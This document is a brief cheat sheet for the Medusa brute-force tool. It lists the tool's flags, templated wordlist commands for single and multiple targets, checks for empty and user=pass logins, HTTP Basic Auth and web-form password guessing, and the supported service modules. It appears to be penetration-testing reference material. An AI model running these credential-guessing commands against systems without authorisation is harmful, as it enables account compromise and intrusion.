# Medusa

Flags: `-h`/`-H` (single/list target), `-u`/`-U` (single/list user), `-p`/`-P` (single/list pass), `-M` (module), `-m` (module options), `-t` (threads), `-f` stop on first hit current host / `-F` any host, `-n` (non-default port), `-v` (verbosity 0–6).

Standard wordlist attack:

```bash
medusa -h <TARGET> -U <WORDLIST_U> -P <WORDLIST_P> -M <module>
```

Multi-target from file:

```bash
medusa -H targets.txt -U <WORDLIST_U> -P <WORDLIST_P> -M <module>
```

Check empty passwords (`n`) and user=pass (`s`) — useful against default configs:

```bash
medusa -h <TARGET> -U <WORDLIST_U> -e ns -M <module>
```

HTTP GET (Basic Auth, multi-target):

```bash
medusa -H targets.txt -U <WORDLIST_U> -P <WORDLIST_P> -M http -m GET
```

Web form POST with failure string:

```bash
medusa -h <TARGET> -U <WORDLIST_U> -P <WORDLIST_P> -M web-form -m "FORM:username=^USER^&password=^PASS^:F=Invalid"
```

Quick module reference: `ssh` `ftp` `rdp` `vnc` `mysql` `http` `web-form` `telnet` `pop3` `imap` `svn`